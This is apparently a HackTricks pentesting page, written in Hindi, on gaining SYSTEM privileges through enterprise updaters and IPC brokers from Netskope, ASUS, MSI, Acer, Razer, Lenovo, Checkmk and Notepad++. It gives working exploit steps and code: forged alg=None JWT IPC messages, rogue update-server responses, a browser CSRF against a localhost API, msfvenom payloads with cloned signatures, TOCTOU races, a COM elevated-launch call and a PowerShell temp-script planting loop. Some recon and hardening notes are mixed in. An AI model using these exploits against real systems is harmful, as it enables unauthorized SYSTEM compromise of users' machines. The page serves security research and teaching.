# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (जैसे Netskope, ASUS और MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज Windows के local privilege escalation chains की एक श्रेणी को सामान्य रूप में प्रस्तुत करता है। ये chains enterprise endpoint agents और updaters में पाई गई हैं, जहाँ कम friction वाला IPC surface और privileged update flow मौजूद होता है। इसका एक प्रतिनिधि उदाहरण Windows के लिए Netskope Client < R129 (CVE-2025-0309) है, जहाँ low-privileged user enrollment को attacker-controlled server की ओर मोड़ सकता है और फिर malicious MSI भेज सकता है, जिसे SYSTEM service इंस्टॉल करती है।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

इसी तरह के products के विरुद्ध इस्तेमाल किए जा सकने वाले मुख्य विचार:
- Re-enrollment या reconfiguration को attacker server की ओर मोड़ने के लिए privileged service के localhost IPC का दुरुपयोग करें।
- Vendor के update endpoints लागू करें, rogue Trusted Root CA भेजें, और updater को malicious, “signed” package की ओर निर्देशित करें।
- कमज़ोर signer checks (CN allow-lists), optional digest flags और ढीली MSI properties को bypass करें।
- यदि IPC “encrypted” है, तो registry में संग्रहित world-readable machine identifiers से key/IV निकालें।
- यदि service callers को image path/process name के आधार पर प्रतिबंधित करती है, तो allow-listed process में inject करें या किसी process को suspended अवस्था में spawn करके minimal thread-context patch के ज़रिए अपनी DLL bootstrap करें।

Custom local TCP services की भी identity और input-boundary की उतनी ही समीक्षा होनी चाहिए, भले ही उन्हें PIN या किसी अन्य application credential की आवश्यकता हो। Listener को उसके process और effective service account से जोड़ें, फिर exact deployed binary/version की जाँच करें और देखें कि caller-controlled fields को fixed buffers में copy करने या child-process command बनाने से पहले उनकी length जाँची जाती है या नहीं। [Microsoft की buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) बताती है कि privileged native code में unchecked external input खतरनाक क्यों है। केवल loopback listener, hardcoded credential या process name से memory corruption या SYSTEM execution साबित नहीं होता; reachability, authorization, code path और mitigations अलग-अलग शर्तें हैं। Live service को crash-length inputs भेजने के बजाय routine enumeration को passive रखें।

---
## 1) localhost IPC के ज़रिए enrollment को attacker server की ओर मोड़ना

कई agents में user-mode UI process होता है, जो localhost TCP पर JSON का उपयोग करके SYSTEM service से बात करता है।

Netskope में देखा गया:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) ऐसा JWT enrollment token बनाएँ जिसके claims backend host को नियंत्रित करते हों (जैसे AddonUrl)। alg=None का उपयोग करें, ताकि signature की आवश्यकता न हो।
2) अपने JWT और tenant name के साथ provisioning command लागू करने वाला IPC message भेजें:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Service enrollment/config के लिए आपके rogue server से संपर्क करना शुरू करता है, जैसे:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

ध्यान दें:
- अगर caller verification path/name-based है, तो request किसी allow-listed vendor binary से भेजें (देखें §4)।<sup>[[1]](#references)[[2]](#references)</sup>

### Network-exposed management IPC

यह trust boundary हमेशा localhost तक सीमित नहीं होती। रिपोर्ट किए गए MyReport Updater 2.1.1 मामले में, एक `LocalSystem` service सभी interfaces पर सुन रही थी और reference host, port और operating mode में unauthenticated gRPC configuration change स्वीकार कर रही थी। Remote variant के लिए listener तक network access और चुने हुए reference तक service से outbound access—दोनों आवश्यक थे। इनका आकलन इस बात से अलग करें कि बाद का package flow file-write boundary को पार कर सकता है या नहीं।<sup>[[16]](#references)</sup>

---
## 2) SYSTEM के रूप में code चलाने के लिए update channel को hijack करना

जब client आपके server से बात करने लगे, तो अपेक्षित endpoints लागू करें और उसे attacker MSI की ओर निर्देशित करें। सामान्य क्रम:

1) /v2/config/org/clientconfig → बहुत कम updater interval वाला JSON config लौटाएँ, जैसे:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA certificate लौटाएँ। Service इसे Local Machine Trusted Root store में install करती है।
3) /v2/checkupdate → किसी malicious MSI और fake version की ओर संकेत करने वाला metadata दें।

वास्तविक मामलों में दिखने वाले आम checks को bypass करना:
- Signer CN allow-list: Service सिर्फ़ यह जाँच सकती है कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपका rogue CA उस CN वाला leaf issue कर सकता है और MSI को sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम की एक benign MSI property शामिल करें। Install के दौरान इसे enforce नहीं किया जाता।
- Optional digest enforcement: config flag (उदाहरण के लिए, check_msi_digest=false) अतिरिक्त cryptographic validation को disable कर देता है।

नतीजा: SYSTEM service आपके MSI को
C:\ProgramData\Netskope\stAgent\data\*.msi
से install करती है और NT AUTHORITY\SYSTEM के रूप में arbitrary code execute करती है।<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass से मिलने वाला सबक: अगर कोई vendor update source को cryptographically authenticate करने के बजाय “trusted” domains की एक छोटी सूची allow-list करके जवाब देता है, तो vendor-owned redirectors या reverse proxies खोजें, जिनके ज़रिए आप अब भी traffic को steer कर सकते हैं। Netskope के मामले में, बाद की सार्वजनिक research से पता चला कि R129-युग की allow-list का दुरुपयोग अब भी `rproxy.goskope.com` के ज़रिए किया जा सकता था, जो attacker-controlled Azure App Service content को proxy करता था। Hostname allow-lists को trust boundary नहीं, बल्कि सिर्फ़ एक speed bump मानें।<sup>[[14]](#references)</sup>

एक अन्य failure mode है **self-consistent लेकिन unauthenticated package metadata**। MyReport मामले में, attacker-controlled reference ने एक modified archive serve किया, जबकि एक intermediary ने vendor के MD5 digest और size responses को updater तक पहुँचने से पहले बदल दिया। उन values का मिलान करने से सिर्फ़ response consistency जाँची गई, vendor origin नहीं; MD5 collision की ज़रूरत नहीं थी। Caller द्वारा चुनी गई installation directory ने privileged extraction को file-write boundary बना दिया। इससे मिलने वाली DLL-loading primitive, [arbitrary file write को DLL hijacking में chain करने](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) के अंतर्गत शामिल है।<sup>[[16]](#references)</sup>

---
## 3) Encrypted IPC requests को forge करना (अगर मौजूद हों)

R127 से, Netskope ने IPC JSON को encryptData field में wrap करना शुरू किया, जो Base64 जैसा दिखता है। Reverse engineering से पता चला कि यह AES का उपयोग करता है, जिसकी key/IV registry values से derived होती है और जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption को दोबारा बना सकते हैं और standard user से valid encrypted commands भेज सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup> सामान्य सुझाव: अगर कोई agent अचानक अपने IPC को “encrypt” करने लगे, तो material के रूप में HKLM के अंतर्गत device IDs, product GUIDs और install IDs खोजें।

---
## 4) IPC caller allow-lists को bypass करना (path/name checks)

कुछ services TCP connection के PID को resolve करके और image path/name की तुलना Program Files के अंतर्गत मौजूद allow-listed vendor binaries (जैसे, stagentui.exe, bwansvc.exe, epdlp.exe) से करके peer को authenticate करने की कोशिश करती हैं।

Bypass के दो व्यावहारिक तरीके:
- किसी allow-listed process (जैसे, nsdiag.exe) में DLL injection करें और उसके अंदर से IPC proxy करें।
- किसी allow-listed binary को suspended अवस्था में spawn करें और driver-enforced tamper rules को पूरा करने के लिए CreateRemoteThread के बिना अपनी proxy DLL bootstrap करें (§5 देखें)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection के अनुकूल injection: suspended process + NtContinue patch

Products अक्सर protected processes के handles से खतरनाक rights हटाने के लिए minifilter/OB callbacks driver (जैसे, Stadrv) के साथ आते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

इन constraints का पालन करने वाला एक विश्वसनीय user-mode loader:
1) CREATE_SUSPENDED के साथ किसी vendor binary का CreateProcess करें।
2) ऐसे handles प्राप्त करें जिनकी आपको अब भी अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और THREAD_GET_CONTEXT/THREAD_SET_CONTEXT वाला thread handle (या अगर आप किसी ज्ञात RIP पर code patch करते हैं, तो सिर्फ़ THREAD_RESUME)।
3) ntdll!NtContinue (या किसी अन्य शुरुआती, guaranteed-mapped thunk) को एक छोटे stub से overwrite करें, जो आपकी DLL path पर LoadLibraryW call करे और फिर वापस jump करे।
4) In-process अपने stub को trigger करके अपनी DLL load करने के लिए ResumeThread करें।

चूँकि आपने पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने उसे स्वयं create किया था), इसलिए driver की policy का पालन होता है।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) व्यावहारिक tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing और ज़रूरी endpoints serve करने की प्रक्रिया automate करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।<sup>[[3]](#references)</sup>
- UpSkope एक custom IPC client है, जो arbitrary (वैकल्पिक रूप से AES-encrypted) IPC messages तैयार करता है और allow-listed binary से requests भेजने के लिए suspended-process injection भी शामिल करता है।<sup>[[4]](#references)</sup>

## 7) Unknown updater/IPC surfaces के लिए fast triage workflow

किसी नए endpoint agent या motherboard “helper” suite की जाँच करते समय, यह जानने के लिए आम तौर पर एक quick workflow काफ़ी होता है कि क्या आपके सामने privesc का एक promising target है:<sup>[[6]](#references)</sup>

1) Loopback listeners enumerate करें और उन्हें vendor processes से map करें:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) संभावित named pipes की सूची बनाएं:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) plugin-आधारित IPC servers द्वारा उपयोग किए जाने वाले registry में संग्रहीत routing data को खंगालें:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

पहले user-mode client से endpoint names, JSON keys, और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) वास्तविक trust predicate खोजें, केवल उस code path को नहीं जो अंततः process launch करता है:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

प्राथमिकता देने योग्य पैटर्न:
- `CryptQueryObject`/certificate parsing में `WinVerifyTrust` का उपयोग न होना आमतौर पर यह दर्शाता है कि “certificate exists” को “certificate is trusted” मान लिया गया था, जिससे certificate cloning या अन्य fake-signer tricks संभव हो जाती हैं।
- `Origin`, `Referer`, download URLs, process names या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` आमतौर पर attacker-controlled lookalike domains के ज़रिए exploit किया जा सकता है।
- अगर low-privileged GUI तय करता है कि “the file is trusted” और SYSTEM broker बस उस नतीजे का उपयोग करता है, तो client-side DLL/JS को patch या reimplement करके boundary को पूरी तरह bypass किया जा सकता है (Razer-style split validation)।
- अगर broker किसी payload को `%TEMP%`/`C:\Windows\Temp` में copy करके फिर उसी path से validate या schedule करता है, तो तुरंत TOCTOU replacement windows और ऐसे sibling plugin modules जाँचें जो कमज़ोर checks वाले alternate `ExecuteTask()` wrappers उपलब्ध कराते हों।<sup>[[6]](#references)</sup>

Named-pipe-heavy targets के लिए, protocol को गहराई से reverse करना शुरू करने से पहले कमज़ोर DACLs और remotely reachable pipes पहचानने का PipeViewer एक तेज़ तरीका है।<sup>[[11]](#references)</sup>

अगर target callers को केवल PID, image path या process name के आधार पर authenticate करता है, तो इसे boundary के बजाय एक speed bump मानें: legitimate client में inject करना या allow-listed process से connection बनाना अक्सर server के checks को पूरा करने के लिए पर्याप्त होता है। खास तौर पर named pipes के लिए, [client impersonation और pipe abuse के बारे में यह पेज](named-pipe-client-impersonation.md) इस primitive को और विस्तार से बताता है।

Privileged **cleanup या restore broker** के लिए, pipe ACL के साथ path trust boundary की भी जाँच करें। कम अधिकार वाला caller shared directory में restore destination चुनने या staged backup artifact का नाम बदलने में सक्षम हो सकता है, भले ही service executable और उसका install directory सुरक्षित हों। अलग-अलग पुष्टि करें कि caller restore command तक पहुँच सकता है, exact staged input या filename को बदल सकता है, broker higher identity के तहत चलता है, और उसका restore operation वास्तव में चुने गए protected path पर लिखता है। केवल writable staging directory या readable pipe से arbitrary privileged write साबित नहीं होता; destination mapping और service behavior की जाँच code review या नियंत्रित testing से करनी होगी। Passive enumeration के दौरान कोई अज्ञात cleanup command न चलाएँ, क्योंकि वह user files delete कर सकता है।

---
## 8) केवल vendor signatures द्वारा authenticated modular add-in brokers (Lenovo Vantage pattern)

ध्यान देने लायक एक नया रूप **signed-client RPC broker** है: कम अधिकार वाला Lenovo-signed desktop process SYSTEM service से बात करता है, और service `%ProgramData%` के अंतर्गत XML-described add-ins के सेट में JSON commands route करती है। किसी भी accepted signed client के **अंदर code execution हासिल होने के बाद**, हर `runas="system"` contract आपके attack surface का हिस्सा बन जाता है।<sup>[[15]](#references)</sup>

Lenovo Vantage research में देखे गए high-value primitives:
- **Caller पर भरोसा करना क्योंकि उस पर vendor के हस्ताक्षर हैं**: researchers ने Lenovo-signed EXE को writable directory में copy करके और DLL side-load (`profapi.dll`) को सफल बनाकर authenticated context हासिल किया, जिससे पहले से trusted client के अंदर arbitrary code चला।
- **Manifest-आधारित attack surface की खोज**: add-ins `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के अंतर्गत घोषित होते हैं; कई contracts `SYSTEM` के रूप में चलते हैं, इसलिए उन manifests की enumeration से अक्सर broker को खुद reverse करने की तुलना में असली privileged verbs जल्दी पता चल जाते हैं।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर पहुँचने के बाद, public research में update/install verbs में path-traversal + race conditions, privileged settings databases में raw-SQL abuse और registry path checks में substring-based bugs मिले, जिनसे intended hive के बाहर writes संभव हुए।

Target पर उपयोगी recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

व्यावहारिक सीख: जब भी कोई helper suite ऐसा broker उपलब्ध कराए जो पहले **caller process** को authenticate करता है और उसके बाद ही दर्जनों plugin/add-in commands को dispatch करता है, तो front-door trust check को bypass करने के बाद रुकें नहीं। manifest/contract table को dump करें और हर high-privilege verb को अलग-अलग fuzz करें; authenticated channel में अक्सर दूसरे चरण के कई bugs छिपे होते हैं।

---
## 1) privileged HTTP APIs के विरुद्ध browser-to-localhost CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 पर एक user-mode HTTP service (ADU.exe) उपलब्ध कराता है, जो https://driverhub.asus.com से आने वाली browser calls की अपेक्षा करता है। Origin filter, Origin header और `/asus/v1.0/*` के ज़रिए उपलब्ध download URLs पर `string_contains(".asus.com")` चलाता है। इसलिए `https://driverhub.asus.com.attacker.tld` जैसे किसी भी attacker-controlled host से check पास हो जाता है और JavaScript के ज़रिए state-changing requests भेजी जा सकती हैं।<sup>[[6]](#references)</sup> अतिरिक्त bypass patterns के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

व्यावहारिक तरीका:
1) ऐसा domain register करें जिसमें `.asus.com` शामिल हो और उस पर एक malicious webpage host करें।
2) `http://127.0.0.1:53000` पर किसी privileged endpoint (जैसे `Reboot`, `UpdateApp`) को call करने के लिए `fetch` या XHR का उपयोग करें।
3) handler के अपेक्षित JSON body को भेजें – packed frontend JS में नीचे दिया गया schema दिखता है।

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

नीचे दिखाया गया PowerShell CLI भी तब सफल होता है, जब Origin header को spoof करके trusted value पर सेट किया जाता है:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

इसलिए हमलावर की साइट पर किसी भी browser visit से 1-click (या `onload` के ज़रिए 0-click) local CSRF होता है, जो SYSTEM helper को सक्रिय करता है।

---
## 2) असुरक्षित code-signing verification और certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में दिए गए arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation में वही substring logic इस्तेमाल होता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार हो जाता है। Download के बाद, ADU.exe केवल यह जाँचता है कि PE में signature मौजूद है और Subject string ASUS से मेल खाती है—`WinVerifyTrust` या chain validation नहीं होती।

इस flow का दुरुपयोग करने के लिए:
1) एक payload बनाएँ (जैसे, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) ASUS के signer को उसमें clone करें (जैसे, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को `.asus.com` जैसे दिखने वाले domain पर host करें और ऊपर बताए गए browser CSRF के ज़रिए UpdateApp को trigger करें।

क्योंकि Origin और URL दोनों filters substring पर आधारित हैं और signer check केवल strings की तुलना करता है, DriverHub हमलावर की binary को अपने elevated context में डाउनलोड करके execute करता है।<sup>[[6]](#references)</sup>

---
## 1) updater के copy/execute paths में TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP protocol उपलब्ध कराती है, जिसमें हर frame का format `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। Core component (Component ID `0f 27 00 00`) में `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` शामिल है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के ज़रिए signature verify करता है (certificate subject का “MICRO-STAR INTERNATIONAL CO., LTD.” से मेल खाना और `WinVerifyTrust` का सफल होना ज़रूरी है)।
3) एक scheduled task बनाता है, जो temp file को हमलावर के नियंत्रण वाले arguments के साथ SYSTEM के रूप में चलाता है।

Verification और `ExecuteTask()` के बीच copied file lock नहीं होती। हमलावर:
- Frame A भेज सकता है, जो एक legitimate MSI-signed binary का path देता है (इससे signature check पास होना और task queue होना सुनिश्चित होता है)।
- Verification पूरी होने के ठीक बाद `MSI Center SDK.exe` को malicious payload से overwrite करने के लिए बार-बार Frame B messages भेजकर race कर सकता है।

Scheduler के task चलाने पर, वह validated original file के बजाय overwritten payload को SYSTEM के रूप में execute करता है। विश्वसनीय exploitation के लिए दो goroutines/threads इस्तेमाल करके `CMD_AutoUpdateSDK` को तब तक लगातार भेजें, जब तक TOCTOU window जीत न ली जाए।<sup>[[6]](#references)</sup>

---
## 2) custom SYSTEM-level IPC और impersonation का दुरुपयोग (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा load किया गया हर plugin/DLL एक Component ID पाता है, जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` में store होता है। Frame के पहले 4 bytes उस component को चुनते हैं, जिससे हमलावर commands को arbitrary modules तक route कर सकते हैं।
- Plugins अपने task runners परिभाषित कर सकते हैं। `Support\API_Support.dll` में `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` उपलब्ध है और यह सीधे `API_Support.EX_Task::ExecuteTask()` को call करता है—**signature validation के बिना**। कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` पर point करके निश्चित रूप से SYSTEM execution पा सकता है।
- Wireshark से loopback traffic sniff करने या dnSpy में .NET binaries instrument करने पर Component ↔ command mapping जल्दी सामने आ जाती है; इसके बाद custom Go/ Python clients frames को replay कर सकते हैं।<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes और impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` उपलब्ध कराता है और इसका discretionary ACL remote clients (जैसे, `\\TARGET\pipe\treadstone_service_LightMode`) को अनुमति देता है। File path के साथ command ID `7` भेजने पर service का process-spawning routine invoke होता है।
- Client library args के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` से dynamic instrumentation ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) में instrumentation के सुझाव देखें) से पता चलता है कि native handler `CreateProcessAsUser` call करने से पहले इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में map करता है।
- 113 (`0x71`) को 114 (`0x72`) से बदलने पर generic branch चलती है, जो पूरा SYSTEM token बनाए रखती है और high-integrity SID (`S-1-16-12288`) सेट करती है। इसलिए spawned binary स्थानीय रूप से और cross-machine दोनों स्थितियों में unrestricted SYSTEM के रूप में चलती है।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ इस्तेमाल करके lab VMs पर भी ACC install किया जा सकता है और vendor hardware के बिना pipe को test किया जा सकता है।<sup>[[6]](#references)</sup>

ये IPC bugs बताते हैं कि localhost services को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) क्यों लागू करनी चाहिए और हर module के “run arbitrary binary” helper में समान signer verifications क्यों होनी चाहिए।

---
## 3) कमजोर user-mode validation पर आधारित COM/IPC “elevator” helpers (Razer Synapse 4)

Razer Synapse 4 ने इस तरह के मामलों में एक और उपयोगी pattern जोड़ा: कम privileges वाला user `RzUtility.Elevator` के ज़रिए process launch करने के लिए COM helper से अनुरोध कर सकता है, जबकि trust का निर्णय privileged boundary के भीतर मजबूती से लागू करने के बजाय user-mode DLL (`simple_service.dll`) को सौंपा जाता है।

देखा गया exploitation path:
- COM object `RzUtility.Elevator` को instantiate करें।
- elevated launch का अनुरोध करने के लिए `LaunchProcessNoWait(<path>, "", 1)` call करें।
- सार्वजनिक PoC में request भेजने से पहले `simple_service.dll` के भीतर PE-signature gate को patch करके हटा दिया जाता है, जिससे हमलावर की पसंद का arbitrary executable launch हो सकता है।<sup>[[6]](#references)[[10]](#references)</sup>

PowerShell का न्यूनतम invocation:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

सामान्य निष्कर्ष: “helper” suites को reverse करते समय केवल localhost TCP या named pipes तक सीमित न रहें। `Elevator`, `Launcher`, `Updater` या `Utility` जैसे नामों वाली COM classes की जाँच करें, फिर सत्यापित करें कि privileged service वास्तव में target binary को खुद validate करती है या केवल उस नतीजे पर भरोसा करती है जिसकी गणना patch की जा सकने वाली user-mode client DLL ने की है। यह pattern Razer के अलावा भी लागू होता है: ऐसा कोई भी split design, जिसमें high-privilege broker low-privilege side से मिले allow/deny निर्णय का उपयोग करता है, संभावित privesc surface है।


---
## MSI repair के दौरान predictable temp script execution (Checkmk Agent / CVE-2024-0670)

कुछ Windows agents अब भी privileged actions इस तरह लागू करते हैं कि वे `C:\Windows\Temp` में एक temporary `.cmd` लिखते हैं और उसे `SYSTEM` के रूप में execute करते हैं। यदि filename predictable हो और service मौजूदा files को सुरक्षित तरीके से दोबारा न बनाए, तो low-privileged user भविष्य की temp file को पहले से **read-only** बनाकर रख सकता है और privileged process से उसकी अपनी script के बजाय attacker-controlled content execute करवा सकता है।

Vulnerable Checkmk Agent builds में देखा गया:
- temp pattern: `cmk_all_<PID>_1.cmd`
- प्रभावित branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package का MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

व्यावहारिक workflow:
1. मौजूदा process IDs या चल रहे agent PID के आधार पर PID की एक यथार्थवादी range का अनुमान लगाएँ।
2. एक छोटा **ASCII** `.cmd` payload लिखें (`Set-Content -Encoding Ascii` या `cmd.exe` redirection का उपयोग करें; batch files के लिए UTF-16 PowerShell output से बचें)।
3. संभावित range में `C:\Windows\Temp\cmk_all_<PID>_1.cmd` की कई files बनाएँ और हर file को read-only चिह्नित करें।
4. cached MSI का repair trigger करें, ताकि privileged service temp script को दोबारा बनाने की कोशिश करे और फिर उसे execute करे।<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

यदि असुरक्षित product Windows Installer से इंस्टॉल किया गया है, तो repair शुरू करने से पहले `C:\Windows\Installer` में मौजूद बेतरतीब-सा दिखने वाले cached MSI को उसके product name से जोड़ें:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta` तब उपयोगी है जब non-interactive WinRM shell से `msiexec /fa` विफल हो जाए और आपको यह समझना हो कि कोई मौजूदा desktop/disconnected session repair को सही ढंग से ट्रिगर कर सकता है या नहीं।<sup>[[7]](#references)</sup>
- यह पैटर्न अन्य endpoint agents और updaters पर भी लागू होता है, जो **world-writable locations में temp scripts stage करते हैं और बाद में उन्हें SYSTEM के रूप में execute करते हैं**। predictable names, exclusive create semantics की कमी, और ऐसे repair/update flows की जांच करें जिन्हें मांग पर ट्रिगर किया जा सके।

### Interactive installer repair और privileged console

PDF24 Creator 11.15.1 एक अलग MSI-repair जोखिम दिखाता है: इसका printer-install custom action repair के दौरान SYSTEM अधिकारों के साथ एक visible console शुरू कर सकता है। Vendor ने इस व्यवहार को ठीक करने के लिए MSI installer को 11.15.2 में बदला। पुराने product version को केवल शुरुआती जांच का संकेत मानें। जांचें कि MSI package registered है या पहुंच योग्य है, क्या यह user repair शुरू कर सकता है, क्या vulnerable custom action और log-file delay मौजूद हैं, और क्या interactive desktop console दिखा सकता है। रिपोर्ट किए गए delay में `faxPrnInst.log` पर oplock का उपयोग किया गया था; केवल सामान्य file writability ही access की शर्त नहीं थी। Non-interactive shell, पहुंच से बाहर package या patched installer इस chain को तोड़ सकते हैं। यह issue `AlwaysInstallElevated` पर निर्भर नहीं करता और predictable temporary script को बदलने से अलग है।

---
## कमजोर updater validation के ज़रिए remote supply-chain hijack (WinGUp / Notepad++)

जून 2025 से दिसंबर 2025 के बीच, Notepad++ update flow के पीछे की hosting infrastructure से समझौता करने वाले attackers ने चुनिंदा victims को दुर्भावनापूर्ण manifests भेजे। पुराने WinGUp-आधारित updaters update की authenticity को पूरी तरह verify नहीं करते थे, इसलिए hostile XML response clients को attacker-नियंत्रित URLs पर redirect कर सकता था। चूंकि client ने HTTPS content स्वीकार करते समय trusted certificate chain और downloaded installer पर valid PE signature—दोनों लागू नहीं किए, victims ने trojanized NSIS `update.exe` fetch करके execute किया।<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (किसी local exploit की आवश्यकता नहीं):
1. **Infrastructure interception**: CDN/hosting से समझौता करें और update checks के जवाब में attacker metadata दें, जो किसी दुर्भावनापूर्ण download URL की ओर इंगित करता हो।
2. **Trojanized NSIS**: installer एक payload fetch/execute करता है और दो execution chains का दुरुपयोग करता है:
   - **अपनी signed binary लाएं + sideload**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसके search path में दुर्भावनापूर्ण `log.dll` डालें। Signed binary चलने पर Windows `log.dll` को sideload करता है, जो Chrysalis backdoor को decrypt करके reflectively load करता है (static detection में बाधा डालने के लिए Warbird-protected + API hashing)।
   - **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है, जो shellcode inject करने और Cobalt Strike Beacon stage करने के लिए Win32 APIs (जैसे, `EnumWindowStationsW`) का उपयोग करती है।<sup>[[12]](#references)</sup>

किसी भी auto-updater के लिए hardening/detection संबंधी मुख्य बातें:
- Downloaded installer का **certificate + signature verification** लागू करें (vendor signer को pin करें, mismatched CN/chain को अस्वीकार करें) और update manifest पर खुद signature करें (जैसे, XMLDSig)। Manifest-नियंत्रित redirects को validation के बिना block करें।
